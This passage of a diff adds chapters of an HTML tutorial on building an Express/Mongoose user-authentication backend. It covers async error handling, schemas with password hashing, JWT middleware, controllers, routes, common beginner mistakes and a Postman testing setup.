+        → If FAILURE → process.exit(1)    → crash intentionally</div>
+
+  <h3>Why This Order Matters</h3>
+  <ul>
+    <li><strong>dotenv first</strong> — every import after it needs <code>process.env.*</code>. Load it before anything that reads env vars.</li>
+    <li><strong>DB before listen</strong> — if DB fails, starting the HTTP server is pointless. Fail fast, fail loudly.</li>
+    <li><strong><code>process.exit(1)</code> not just throw</strong> — exit code 1 signals error to process managers (PM2, Docker) so they can restart the service automatically.</li>
+    <li><strong>Middleware before routes</strong> — <code>express.json()</code> must be registered before the routes that need <code>req.body</code>.</li>
+  </ul>
+
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"What does <code>express.json()</code> do? What happens without it?" — It parses the incoming JSON request body and populates <code>req.body</code>. Without it, <code>req.body</code> is <code>undefined</code> — every controller that reads body fields gets <code>undefined</code>.</p>
+    <p>"What does <code>express.urlencoded()</code> do?" — Parses HTML form data (application/x-www-form-urlencoded). The <code>extended: true</code> option allows nested objects. Needed when forms POST data — without it, form fields don't appear in <code>req.body</code>.</p>
+    <p>"What does <code>process.exit(1)</code> mean?" — Terminates the Node process. Exit code 1 = error. Exit code 0 = clean exit. Process managers watch exit codes to decide if they should restart.</p>
+  </div>
+</section>
+
+<!-- ═══ CHAPTER 4 ═══════════════════════════════════════ -->
+<section class="chapter" id="ch4">
+  <div class="ch-eyebrow">// CH.04</div>
+  <h2>Utils — The Foundation Layer</h2>
+  <p class="chapter-desc">Build these first. Everything else depends on them. Pure functions — no Express, no Mongoose.</p>
+
+  <h3>asyncHandler.js — The Most Important Util</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">utils/asyncHandler.js</div>
+    <pre><span class="cm">// Without asyncHandler — every controller looks like this:</span>
+<span class="cm">// const someController = async (req, res) => {</span>
+<span class="cm">//   try { ...logic... } catch(err) { res.status(500).json({error: err.message}) }</span>
+<span class="cm">// }</span>
+
+<span class="cm">// With asyncHandler — controllers have zero try/catch:</span>
+<span class="kw">const</span> <span class="fn">asyncHandler</span> = (<span class="var">fn</span>) => (<span class="var">req</span>, <span class="var">res</span>, <span class="var">next</span>) => {
+  Promise.<span class="fn">resolve</span>(<span class="fn">fn</span>(<span class="var">req</span>, <span class="var">res</span>, <span class="var">next</span>)).<span class="fn">catch</span>(<span class="var">next</span>)
+  <span class="cm">// .catch(next) = caught errors go to Express error handler via next(error)</span>
+}</pre>
+  </div>
+  <p>The trick: <code>catch(next)</code> calls <code>next(error)</code> automatically on any thrown error. Express then routes it to a global error handler. Forgetting try/catch in one controller no longer crashes the server.</p>
+
+  <h3>apiError.js — Custom Error Class</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">utils/apiError.js</div>
+    <pre><span class="kw">class</span> <span class="fn">ApiError</span> <span class="kw">extends</span> Error {
+  <span class="fn">constructor</span>(<span class="var">statusCode</span>, <span class="var">message</span>) {
+    <span class="kw">super</span>(<span class="var">message</span>)          <span class="cm">// sets this.message + this.stack (from Error)</span>
+    <span class="kw">this</span>.<span class="prop">code</span>    = <span class="var">statusCode</span>
+    <span class="kw">this</span>.<span class="prop">success</span> = <span class="kw">false</span>
+    <span class="kw">this</span>.<span class="prop">data</span>    = <span class="kw">null</span>
+  }
+}
+
+<span class="cm">// Usage in any controller or middleware:</span>
+<span class="kw">throw new</span> <span class="fn">ApiError</span>(<span class="num">401</span>, <span class="str">"Unauthorized"</span>)
+<span class="kw">throw new</span> <span class="fn">ApiError</span>(<span class="num">400</span>, <span class="str">"All fields are required"</span>)</pre>
+  </div>
+  <p>Why <code>extends Error</code>? You get the stack trace automatically, <code>instanceof ApiError</code> checks work, and it integrates with Express's error handling pipeline properly.</p>
+
+  <h3>apiResponse.js — Standard Envelope</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">utils/apiresponse.js</div>
+    <pre><span class="kw">class</span> <span class="fn">ApiResponse</span> {
+  <span class="fn">constructor</span>(<span class="var">statusCode</span>, <span class="var">message</span>, <span class="var">data</span>) {
+    <span class="kw">this</span>.<span class="prop">statusCode</span> = <span class="var">statusCode</span>
+    <span class="kw">this</span>.<span class="prop">message</span>    = <span class="var">message</span>
+    <span class="kw">this</span>.<span class="prop">data</span>       = <span class="var">data</span>
+    <span class="kw">this</span>.<span class="prop">success</span>    = <span class="var">statusCode</span> >= <span class="num">200</span> && <span class="var">statusCode</span> < <span class="num">400</span>  <span class="cm">// auto-computed</span>
+  }
+}
+<span class="cm">// Every success response looks like: { statusCode, message, data, success: true }</span></pre>
+  </div>
+
+  <h3>cloudinary.js — Two-Step Upload</h3>
+  <div class="flow">Client sends file
+  → Multer receives multipart/form-data
+      → Saves to ./public/temp/uniquename.jpg   (local disk)
+          → cloudinary.uploader.upload(localPath)
+              → Cloudinary stores it on cloud CDN
+              → Returns response with .url
+          → fs.unlinkSync(localPath)            (delete local copy — success OR fail)
+  → Controller uses response.url to save in DB</div>
+
+  <div class="callout senior">
+    <div class="callout-label">Senior Dev Says</div>
+    <p>Always delete the temp file in BOTH the success and failure paths. If upload fails and you don't delete, <code>public/temp/</code> fills up silently. On a server with limited disk space, this causes a crash days later with no obvious cause. The project handles this correctly — notice the <code>fs.unlinkSync</code> in both try and catch.</p>
+  </div>
+
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"Why create a custom error class instead of calling <code>res.status().json()</code> everywhere?" — Consistency: all error responses have the same shape. Separation: controllers throw errors, middleware/error handler sends responses. Reusability: one throw works from anywhere in the call stack — model methods, utils, controllers.</p>
+    <p>"Why store files locally before uploading to cloud?" — Cloudinary SDK needs a file path on disk. Multer gives you that path. You can't stream the multipart upload directly to Cloudinary without extra complexity. The two-step pattern is the standard approach.</p>
+  </div>
+</section>
+
+<!-- ═══ CHAPTER 5 ═══════════════════════════════════════ -->
+<section class="chapter" id="ch5">
+  <div class="ch-eyebrow">// CH.05</div>
+  <h2>Models — Designing Your Data</h2>
+  <p class="chapter-desc">Mongoose schemas, pre-save hooks, instance methods. Build models before controllers — controllers depend on models, not vice versa.</p>
+
+  <h3>What is a Mongoose Schema?</h3>
+  <p>MongoDB itself stores any JSON — zero enforcement. Mongoose adds at the application level: type validation, required fields, unique constraints, indexes, default values, and custom methods. Think of a schema as the contract your data must obey before it touches the DB.</p>
+
+  <h3>user.model.js — Field by Field</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Field</th><th>Options Used</th><th>Why</th></tr>
+    <tr><td><code>username</code></td><td>unique, lowercase, index:true</td><td><code>index:true</code> creates a B-tree index in MongoDB → fast search. <code>lowercase</code> ensures case-insensitive uniqueness.</td></tr>
+    <tr><td><code>email</code></td><td>unique, lowercase</td><td>DB-level uniqueness — enforced even if app-level check is bypassed</td></tr>
+    <tr><td><code>password</code></td><td>required</td><td>Only stores bcrypt hash. Raw password NEVER saved.</td></tr>
+    <tr><td><code>refreshToken</code></td><td>String (optional)</td><td>Stored in DB so logout can invalidate it. Absent = logged out.</td></tr>
+    <tr><td><code>watchHistory</code></td><td>[ObjectId ref:"Video"]</td><td>Array of references to Video documents — like a foreign key in SQL. Use <code>.populate()</code> to fetch the actual videos.</td></tr>
+    <tr><td><code>timestamps:true</code></td><td>(schema option)</td><td>Auto-adds <code>createdAt</code> and <code>updatedAt</code> to every document</td></tr>
+  </table></div>
+
+  <h3>The pre("save") Hook</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">models/user.model.js</div>
+    <pre>userSchema.<span class="fn">pre</span>(<span class="str">"save"</span>, <span class="kw">async function</span>() {
+  <span class="kw">if</span> (!<span class="kw">this</span>.<span class="fn">isModified</span>(<span class="str">"password"</span>)) <span class="kw">return</span>  <span class="cm">// ← CRITICAL guard</span>
+  <span class="kw">this</span>.<span class="prop">password</span> = <span class="kw">await</span> bcrypt.<span class="fn">hash</span>(<span class="kw">this</span>.<span class="prop">password</span>, <span class="num">10</span>)
+})</pre>
+  </div>
+  <p><strong>Without <code>isModified</code> check:</strong> updating username or email would re-hash the already-hashed password string. The new hash would be a hash of the old hash. Next login attempt: <code>bcrypt.compare(plaintext, hash_of_hash)</code> → always false → login permanently broken.</p>
+  <p><strong>Salt rounds 10:</strong> higher = slower hash = harder to brute-force. 10 is the industry standard — takes ~100ms per hash, which is imperceptible to users but expensive to attack at scale.</p>
+
+  <h3>Instance Methods — Why on the Model</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Method</th><th>Lives on model because...</th></tr>
+    <tr><td><code>getAccessToken()</code></td><td>Needs <code>this._id</code>, <code>this.email</code>, etc. — belongs to the user object</td></tr>
+    <tr><td><code>getRefreshToken()</code></td><td>Same — data method on its data owner</td></tr>
+    <tr><td><code>isPasswordCorrect()</code></td><td>Needs <code>this.password</code> (the stored hash) — data logic lives with data</td></tr>
+  </table></div>
+  <p>Controllers stay thin and readable. Methods are reusable. If you put bcrypt.compare in the controller, every controller that checks passwords duplicates that logic.</p>
+
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"What is a Mongoose pre-save hook?" — A function that runs before every <code>.save()</code> call. Common uses: hash passwords, generate slugs, update timestamps. Use <code>this.isModified(field)</code> to only run when the relevant field changed.</p>
+    <p>"What is <code>populate()</code> in Mongoose?" — Replaces an ObjectId reference with the actual document from the referenced collection. Like a SQL JOIN but at the application layer. Example: <code>User.findById(id).populate("watchHistory")</code> replaces video IDs with full video objects.</p>
+    <p>"What is the difference between instance methods and static methods?" — Instance methods (<code>userSchema.methods.fn</code>) are called on a document instance: <code>user.isPasswordCorrect()</code>. Static methods (<code>userSchema.statics.fn</code>) are called on the Model itself: <code>User.findByEmail()</code>.</p>
+  </div>
+</section>
+
+<!-- ═══ CHAPTER 6 ═══════════════════════════════════════ -->
+<section class="chapter" id="ch6">
+  <div class="ch-eyebrow">// CH.06</div>
+  <h2>Middlewares — The Checkpoint System</h2>
+  <p class="chapter-desc">What middleware IS, how the chain works, verifyJWT line by line, and multer explained.</p>
+
+  <h3>The Middleware Chain</h3>
+  <div class="flow">Incoming Request
+  → cors()          → checks origin header, sets CORS response headers → next()
+  → json()          → parses JSON body → populates req.body → next()
+  → urlencoded()    → parses form data → populates req.body → next()
+  → cookie-parser() → parses Cookie header → populates req.cookies → next()
+  → [route match]
+  → verifyJWT()     → reads token → verifies → sets req.user → next()
+  → controller()    → runs business logic → res.json() → DONE</div>
+  <p>Each step either calls <code>next()</code> to continue, or calls <code>res.json()</code> to stop and respond. <code>next(error)</code> skips remaining steps and jumps to the error handler.</p>
+
+  <h3>verifyJWT — Line by Line</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">middlewares/auth.middlewares.js</div>
+    <pre><span class="kw">export const</span> <span class="fn">verifyJWT</span> = <span class="fn">asyncHandler</span>(<span class="kw">async</span>(<span class="var">req</span>, <span class="var">res</span>, <span class="var">next</span>) => {
+  <span class="cm">// 1. Read token from cookie (browser) OR Authorization header (mobile/Postman)</span>
+  <span class="kw">const</span> <span class="var">token</span> = <span class="var">req</span>.<span class="prop">cookies</span>?.<span class="prop">accessToken</span>
+             || <span class="var">req</span>.<span class="fn">header</span>(<span class="str">"Authorization"</span>)?.<span class="fn">replace</span>(<span class="str">"Bearer "</span>, <span class="str">""</span>)
+
+  <span class="kw">if</span> (!<span class="var">token</span>) <span class="kw">throw new</span> <span class="fn">ApiError</span>(<span class="num">401</span>, <span class="str">"Unauthorized request"</span>)
+
+  <span class="cm">// 2. Verify signature + expiry. Throws if invalid or expired.</span>
+  <span class="kw">const</span> <span class="var">decodeToken</span> = jwt.<span class="fn">verify</span>(<span class="var">token</span>, process.env.<span class="prop">ACCESS_TOKEN_SECRET</span>)
+
+  <span class="cm">// 3. Get fresh user from DB (token only carries _id)</span>
+  <span class="kw">const</span> <span class="var">user</span> = <span class="kw">await</span> User.<span class="fn">findById</span>(<span class="var">decodeToken</span>?.<span class="prop">_id</span>)
+                         .<span class="fn">select</span>(<span class="str">"-password -refreshToken"</span>)
+
+  <span class="kw">if</span> (!<span class="var">user</span>) <span class="kw">throw new</span> <span class="fn">ApiError</span>(<span class="num">401</span>, <span class="str">"Invalid Access Token"</span>)
+
+  <span class="cm">// 4. Attach user to request — next handler uses req.user for free</span>
+  <span class="var">req</span>.<span class="prop">user</span> = <span class="var">user</span>
+  <span class="fn">next</span>()
+})</pre>
+  </div>
+  <p><strong>Why two token sources?</strong> Browsers send cookies automatically. Mobile apps and Postman use <code>Authorization: Bearer token</code> headers. Supporting both makes the API usable from all clients.</p>
+  <p><strong>Why attach to <code>req.user</code>?</strong> The logout controller needs <code>user._id</code>. Without <code>req.user</code>, it would need a second DB query. This way the controller gets it for free.</p>
+
+  <h3>multer.middlewares.js</h3>
+  <ul>
+    <li><code>diskStorage</code> saves to disk. Alternative <code>memoryStorage</code> keeps in RAM — bad for large files (runs out of memory)</li>
+    <li>Filename: <code>Date.now() + random + extension</code> — unique timestamp ensures no collisions, <code>path.extname()</code> preserves the file type</li>
+    <li>50MB limit: prevents API abuse — no one should upload a 1GB video through a form</li>
+  </ul>
+
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"What is Express middleware?" — A function with <code>(req, res, next)</code> signature that runs between the incoming request and the route handler. It can modify req/res, end the request, or call <code>next()</code> to continue the chain.</p>
+    <p>"What is the difference between authentication and authorization?" — <strong>Authentication</strong>: proving WHO you are (login with password). <strong>Authorization</strong>: proving you're ALLOWED to do something (admin vs regular user). verifyJWT does authentication. Role-based access would do authorization.</p>
+    <p>"What's the difference between <code>next()</code> and <code>next(error)</code>?" — <code>next()</code> passes to the next middleware/handler in the chain. <code>next(error)</code> skips remaining middleware and jumps directly to Express's error handling middleware (4 arguments: err, req, res, next).</p>
+  </div>
+</section>
+
+<!-- ═══ CHAPTER 7 ═══════════════════════════════════════ -->
+<section class="chapter" id="ch7">
+  <div class="ch-eyebrow">// CH.07</div>
+  <h2>Controllers — Business Logic Layer</h2>
+  <p class="chapter-desc">What controllers do, what they don't do, and each controller function explained with reasoning.</p>
+
+  <p><strong>Controller's job:</strong> receive request → validate input → call model/utils → send response. Nothing more. No DB schema logic, no token config, no file upload config.</p>
+
+  <h3>registerUser — Step by Step</h3>
+  <ol>
+    <li>Extract fields from <code>req.body</code></li>
+    <li>Validate with <code>[field1, field2].some(f => !f || f.trim() === "")</code> — checks all fields at once with one line</li>
+    <li>Check duplicate: <code>User.findOne({ $or: [{ email }, { username }] })</code> — one DB query, handles both cases</li>
+    <li>Get file paths: <code>req.files?.avatar?.[0]?.path</code> — multer sets <code>req.files</code>, not <code>req.body</code></li>
+    <li>Upload to Cloudinary → delete local file → get .url</li>
+    <li><code>User.create()</code> → pre-save hook runs → password auto-hashed</li>
+    <li>Re-fetch with <code>.select("-password -refreshToken")</code> before sending response</li>
+  </ol>
+  <div class="callout senior">
+    <div class="callout-label">Senior Dev Says</div>
+    <p>Why re-fetch the user after <code>User.create()</code> instead of using the returned object? The <code>create()</code> result includes the hashed password field. The <code>.select("-password")</code> call on the re-fetch ensures you never accidentally send the hash to the client, even if someone refactors the code later.</p>
+  </div>
+
+  <h3>loginUser — Cookie Security</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">The options object explained</div>
+    <pre><span class="kw">const</span> <span class="var">options</span> = {
+  <span class="prop">httpOnly</span>: <span class="kw">true</span>,  <span class="cm">// JS in browser CANNOT read this cookie → blocks XSS token theft</span>
+  <span class="prop">secure</span>:   <span class="kw">true</span>   <span class="cm">// Cookie only sent over HTTPS → prevents man-in-the-middle</span>
+}
+<span class="cm">// Stored as variable because reused for both cookies — DRY principle</span>
+res.<span class="fn">cookie</span>(<span class="str">"accessToken"</span>,  <span class="var">accessToken</span>,  <span class="var">options</span>)
+res.<span class="fn">cookie</span>(<span class="str">"refreshToken"</span>, <span class="var">refreshToken</span>, <span class="var">options</span>)</pre>
+  </div>
+  <p><strong>Why send token in both cookie AND JSON body?</strong> Cookies = browsers (auto-sent on every request). JSON body = mobile apps and Postman (they read headers/body, not cookies). One API serves both clients.</p>
+
+  <h3>refreshAccessToken — Token Comparison</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">The critical check</div>
+    <pre><span class="cm">// JWT signature is valid — but is this token still "live"?</span>
+<span class="kw">if</span> (<span class="var">incomingRefreshToken</span> !== <span class="var">user</span>.<span class="prop">refreshToken</span>)
+  <span class="kw">throw new</span> <span class="fn">ApiError</span>(<span class="num">401</span>, <span class="str">"Refresh Token is expired or used"</span>)
+
+<span class="cm">// If user logged out → refreshToken was $unset in DB → null !== token → rejected</span>
+<span class="cm">// If token was rotated → old token !== new token stored → rejected</span></pre>
+  </div>
+
+  <h3>logoutUser</h3>
+  <div class="codeblock">
+    <div class="codeblock-header">$unset vs $set null</div>
+    <pre>User.<span class="fn">findByIdAndUpdate</span>(req.user._id, {
+  <span class="prop">$unset</span>: { <span class="prop">refreshToken</span>: <span class="num">1</span> }  <span class="cm">// removes field entirely</span>
+  <span class="cm">// NOT $set: { refreshToken: null }  ← field stays, just null</span>
+})
+res.<span class="fn">clearCookie</span>(<span class="str">"accessToken"</span>, <span class="var">options</span>)
+res.<span class="fn">clearCookie</span>(<span class="str">"refreshToken"</span>, <span class="var">options</span>)</pre>
+  </div>
+
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"What is XSS and how does <code>httpOnly</code> protect against it?" — XSS (Cross-Site Scripting): attacker injects JavaScript into your page. That script could run <code>document.cookie</code> to steal tokens. <code>httpOnly</code> makes the cookie invisible to JavaScript — <code>document.cookie</code> won't show it. The browser still sends it on requests, but no JS can read it.</p>
+    <p>"What is refresh token rotation?" — Every time you use a refresh token to get a new access token, you also get a NEW refresh token and the old one is invalidated (deleted from DB). If an attacker stole the old refresh token, it no longer works. This limits the window of attack.</p>
+  </div>
+</section>
+
+<!-- ═══ CHAPTER 8 ═══════════════════════════════════════ -->
+<section class="chapter" id="ch8">
+  <div class="ch-eyebrow">// CH.08</div>
+  <h2>Routes — The URL Map</h2>
+  <p class="chapter-desc">Express Router, route structure, middleware on specific routes, and why we separate routes from controllers.</p>
+
+  <div class="codeblock">
+    <div class="codeblock-header">routes/user.router.js — the complete map</div>
+    <pre><span class="cm">// URL → [middlewares] → controller</span>
+router.<span class="fn">route</span>(<span class="str">"/register"</span>)    .<span class="fn">post</span>(<span class="fn">upload.fields</span>([...]), <span class="fn">registerUser</span>)
+router.<span class="fn">route</span>(<span class="str">"/login"</span>)       .<span class="fn">post</span>(<span class="fn">loginUser</span>)
+router.<span class="fn">route</span>(<span class="str">"/logout"</span>)      .<span class="fn">post</span>(<span class="fn">verifyJWT</span>, <span class="fn">logoutUser</span>)   <span class="cm">// ← protected</span>
+router.<span class="fn">route</span>(<span class="str">"/refresh-token"</span>).<span class="fn">post</span>(<span class="fn">refreshAccessToken</span>)
+
+<span class="cm">// Mounted in app.js as:</span>
+app.<span class="fn">use</span>(<span class="str">"/api/v1/users"</span>, <span class="var">userRouter</span>)
+
+<span class="cm">// Final URLs:</span>
+<span class="cm">// POST /api/v1/users/register</span>
+<span class="cm">// POST /api/v1/users/login</span>
+<span class="cm">// POST /api/v1/users/logout</span>
+<span class="cm">// POST /api/v1/users/refresh-token</span></pre>
+  </div>
+
+  <h3>Key Points</h3>
+  <ul>
+    <li><strong>Route-level middleware array:</strong> <code>[upload.fields(), registerUser]</code> — multer runs first, sets <code>req.files</code>, then controller runs</li>
+    <li><strong><code>verifyJWT</code> only on logout</strong> — login/register don't need auth (obviously). Only protected operations need the guard.</li>
+    <li><strong>Why <code>/api/v1/</code>?</strong> When you make breaking API changes, <code>/api/v2/</code> can coexist with <code>/api/v1/</code> while old clients migrate. Without versioning, every API change breaks clients.</li>
+    <li><strong>Why separate Router from app.js?</strong> One Router per resource. <code>app.js</code> stays clean — just mounts routers. Hundreds of routes don't pile up in one file.</li>
+  </ul>
+
+  <div class="callout interview">
+    <div class="callout-label">Interview Q</div>
+    <p>"Why do we use Express Router instead of putting all routes in <code>app.js</code>?" — Modularity. Each resource (users, videos, comments) gets its own router file. Routes are grouped logically, controllers are imported cleanly, and the main <code>app.js</code> stays readable.</p>
+  </div>
+</section>
+
+<!-- ═══ CHAPTER 9 ═══════════════════════════════════════ -->
+<section class="chapter" id="ch9">
+  <div class="ch-eyebrow">// CH.09</div>
+  <h2>JS &amp; Node.js Method Reference</h2>
+  <p class="chapter-desc">Every method, pattern, and operator used in this project — explained at the line level. No more confusion.</p>
+
+  <h3>Mongoose Methods</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Method</th><th>What it does</th><th>Used where</th></tr>
+    <tr><td><code>User.findById(id)</code></td><td>Find one document by its <code>_id</code> field</td><td>genTokens, verifyJWT</td></tr>
+    <tr><td><code>User.findOne(filter)</code></td><td>Find first doc matching filter</td><td>loginUser ($or query)</td></tr>
+    <tr><td><code>User.findByIdAndUpdate(id, update, opts)</code></td><td>Find by ID + update in one atomic DB operation</td><td>logoutUser ($unset)</td></tr>
+    <tr><td><code>User.create({})</code></td><td>Create + save new document — triggers pre-save hook</td><td>registerUser</td></tr>
+    <tr><td><code>.select("-password -refreshToken")</code></td><td>Exclude fields from result. <code>-</code> prefix = exclude. No prefix = include only these.</td><td>After login, register, verifyJWT</td></tr>
+    <tr><td><code>.save({ validateBeforeSave: false })</code></td><td>Save document, skip schema validation for this save</td><td>Saving refreshToken to existing user</td></tr>
+    <tr><td><code>$or: [{ email }, { username }]</code></td><td>MongoDB OR operator — match either condition</td><td>findOne in loginUser</td></tr>
+    <tr><td><code>$unset: { field: 1 }</code></td><td>Remove a field from the document entirely (cleaner than setting to null)</td><td>logoutUser</td></tr>
+  </table></div>
+
+  <h3>JWT (jsonwebtoken)</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Method</th><th>What it does</th></tr>
+    <tr><td><code>jwt.sign(payload, secret, { expiresIn })</code></td><td>Creates a signed token string. Payload is visible but tamper-proof.</td></tr>
+    <tr><td><code>jwt.verify(token, secret)</code></td><td>Verifies signature AND expiry. Returns decoded payload. Throws on invalid/expired.</td></tr>
+    <tr><td><code>expiresIn: "1d"</code></td><td>Formats: <code>"15m"</code> (15 min), <code>"1h"</code> (1 hour), <code>"1d"</code> (1 day), <code>"10d"</code> (10 days)</td></tr>
+  </table></div>
+
+  <h3>bcrypt</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Method</th><th>What it does</th></tr>
+    <tr><td><code>bcrypt.hash(password, saltRounds)</code></td><td>Async. Creates a salted hash. <code>saltRounds=10</code> takes ~100ms. Returns hash string.</td></tr>
+    <tr><td><code>bcrypt.compare(plainText, hash)</code></td><td>Async. Compares raw password against stored hash. Returns true/false. Salt is embedded in the hash.</td></tr>
+  </table></div>
+
+  <h3>Express req / res Properties</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Property / Method</th><th>What it does</th><th>Requires</th></tr>
+    <tr><td><code>req.body</code></td><td>Parsed JSON or form data body</td><td><code>express.json()</code> or <code>express.urlencoded()</code></td></tr>
+    <tr><td><code>req.files</code></td><td>Uploaded files object — <code>req.files.avatar[0].path</code></td><td>multer middleware</td></tr>
+    <tr><td><code>req.cookies</code></td><td>Parsed cookies from Cookie header</td><td><code>cookie-parser</code></td></tr>
+    <tr><td><code>req.header("Authorization")</code></td><td>Reads a specific request header by name</td><td>—</td></tr>
+    <tr><td><code>req.user</code></td><td>Custom property attached by verifyJWT middleware</td><td>verifyJWT to run first</td></tr>
+    <tr><td><code>res.status(200)</code></td><td>Sets HTTP status code. Returns <code>res</code> for chaining.</td><td>—</td></tr>
+    <tr><td><code>res.json({})</code></td><td>Sends JSON response + ends the request</td><td>—</td></tr>
+    <tr><td><code>res.cookie(name, value, opts)</code></td><td>Sets a cookie on the response</td><td>—</td></tr>
+    <tr><td><code>res.clearCookie(name, opts)</code></td><td>Instructs browser to delete the cookie</td><td>—</td></tr>
+  </table></div>
+
+  <h3>JavaScript Patterns</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Pattern</th><th>What it does</th><th>Example</th></tr>
+    <tr><td><code>?.</code> Optional chaining</td><td>Returns <code>undefined</code> instead of throwing if property doesn't exist</td><td><code>req.files?.avatar?.[0]?.path</code></td></tr>
+    <tr><td><code>||</code> OR fallback</td><td>Returns right side if left is falsy (null, undefined, 0, "")</td><td><code>process.env.PORT || 3000</code></td></tr>
+    <tr><td><code>[].some(fn)</code></td><td>Returns <code>true</code> if ANY element passes the test function</td><td>Field validation check</td></tr>
+    <tr><td><code>async/await</code></td><td>Pauses execution until the Promise resolves. Cleaner than .then() chains.</td><td>Every DB or cloud call</td></tr>
+    <tr><td><code>const { a, b } = obj</code></td><td>Destructuring — extract named properties from object</td><td><code>const { accessToken, refreshToken } = await genTokens()</code></td></tr>
+    <tr><td><code>"type": "module"</code></td><td>Enables ES6 <code>import/export</code> instead of CommonJS <code>require()</code></td><td>package.json</td></tr>
+  </table></div>
+
+  <h3>Node.js Built-in Modules</h3>
+  <div class="table-wrap"><table>
+    <tr><th>Module</th><th>Method</th><th>What it does</th></tr>
+    <tr><td><code>fs</code></td><td><code>fs.existsSync(path)</code></td><td>Returns true/false — check before deleting to avoid error</td></tr>
+    <tr><td><code>fs</code></td><td><code>fs.unlinkSync(path)</code></td><td>Deletes file synchronously — used to clean up temp uploads</td></tr>
+    <tr><td><code>path</code></td><td><code>path.extname("image.jpg")</code></td><td>Returns <code>".jpg"</code> — preserves extension for uploaded files</td></tr>
+    <tr><td><code>process</code></td><td><code>process.env.VARIABLE</code></td><td>Reads environment variable — always returns a string, never number</td></tr>
+    <tr><td><code>process</code></td><td><code>process.exit(1)</code></td><td>Terminates Node process. Code 1 = error. Code 0 = clean exit.</td></tr>
+  </table></div>
+</section>
+
+<!-- ═══ CHAPTER 10 ══════════════════════════════════════ -->
+<section class="chapter" id="ch10">
+  <div class="ch-eyebrow">// CH.10</div>
+  <h2>Common Mistakes</h2>
+  <p class="chapter-desc">10 real mistakes every beginner makes. Know them before you make them.</p>
+
+  <ul class="mistake-list">
+    <li>
+      <span class="mistake-num">01</span>
+      <strong>Forgetting <code>express.json()</code></strong>
+      <div>Symptom: <code>req.body</code> is <code>undefined</code> — all body fields are missing.</div>
+      <div class="fix">Fix: Add <code>app.use(express.json())</code> in <code>app.js</code> BEFORE mounting routes.</div>
+    </li>
+    <li>
+      <span class="mistake-num">02</span>
+      <strong>Looking for uploaded files in <code>req.body</code></strong>
+      <div>Symptom: File is undefined. Multer sets <code>req.files</code>, not <code>req.body</code>.</div>
+      <div class="fix">Fix: Use <code>req.files?.avatar?.[0]?.path</code>. Also ensure <code>upload.fields()</code> is on the route.</div>
+    </li>
+    <li>
+      <span class="mistake-num">03</span>
+      <strong>Returning user with password or refreshToken in response</strong>
+      <div>Symptom: API response exposes hashed password or refresh token.</div>
+      <div class="fix">Fix: Always chain <code>.select("-password -refreshToken")</code> before sending user data.</div>
+    </li>
+    <li>
+      <span class="mistake-num">04</span>
+      <strong>Saving to wrong field name (<code>user.newRefreshToken</code>)</strong>
+      <div>Symptom: Token never persists in DB — schema doesn't have that field. Silent failure.</div>
+      <div class="fix">Fix: Must exactly match schema field: <code>user.refreshToken = token</code>.</div>
+    </li>
+    <li>
+      <span class="mistake-num">05</span>
+      <strong>Not deleting temp files after Cloudinary upload</strong>
+      <div>Symptom: <code>public/temp/</code> fills up silently → disk full days later → server crashes mysteriously.</div>
+      <div class="fix">Fix: <code>fs.unlinkSync(localPath)</code> in BOTH the success path AND the catch block.</div>
+    </li>
+    <li>
+      <span class="mistake-num">06</span>
+      <strong>Hardcoding secrets in code</strong>
+      <div>Symptom: <code>jwt.sign(payload, "my-secret")</code> — git history is permanent. Even if deleted, it's recoverable.</div>
+      <div class="fix">Fix: Always use <code>process.env.SECRET_NAME</code> and store real values only in <code>.env</code>.</div>
+    </li>
+    <li>
+      <span class="mistake-num">07</span>
+      <strong>Not calling <code>next()</code> in middleware</strong>
+      <div>Symptom: Request hangs forever — no response, no error, just a timeout.</div>
+      <div class="fix">Fix: Every middleware must either call <code>next()</code>, <code>next(error)</code>, or send a response. Never leave both paths unhandled.</div>
+    </li>
+    <li>
+      <span class="mistake-num">08</span>
+      <strong>Calling <code>next(error)</code> AND <code>res.json()</code></strong>
+      <div>Symptom: "Cannot set headers after they are sent to the client" error.</div>
+      <div class="fix">Fix: Pick one. If you throw/next(error), don't also res.json(). The error handler will respond.</div>
+    </li>
+    <li>
+      <span class="mistake-num">09</span>
+      <strong>Not using <code>validateBeforeSave: false</code> when saving refreshToken</strong>
+      <div>Symptom: Saving the refresh token re-validates all required fields → schema validation error.</div>
+      <div class="fix">Fix: <code>user.save({ validateBeforeSave: false })</code> — only skip when updating internal fields, not user-submitted data.</div>
+    </li>
+    <li>
+      <span class="mistake-num">10</span>
+      <strong>Trusting client-sent user ID for protected routes</strong>
+      <div>Symptom: A user sends <code>req.body.userId = "someOtherUserId"</code> — gets another user's data.</div>
+      <div class="fix">Fix: Always use <code>req.user._id</code> (set by verifyJWT from the verified token). Never trust IDs from request body on protected routes.</div>
+    </li>
+  </ul>
+</section>
+
+<!-- ═══ CHAPTER 11 ══════════════════════════════════════ -->
+<section class="chapter" id="ch11">
+  <div class="ch-eyebrow">// CH.11</div>
+  <h2>Postman / Thunder Client Testing Guide</h2>
+  <p class="chapter-desc">Test every route manually. Set up your collection once, test all 4 routes in order.</p>
+
+  <div class="callout note">
+    <div class="callout-label">Setup</div>
+    <p>Create a collection variable: <code>base_url = http://localhost:8000/api/v1</code><br>
+    Start the server first: <code>npm run dev</code> in your terminal.</p>
+  </div>
+
+  <div class="route-card">
+    <div class="route-header"><span class="method-badge">POST</span><span class="route-url">{{base_url}}/users/register</span></div>
+    <div class="route-body">
+      <p><strong>Body:</strong> <code>form-data</code> (NOT json — because file upload!)</p>
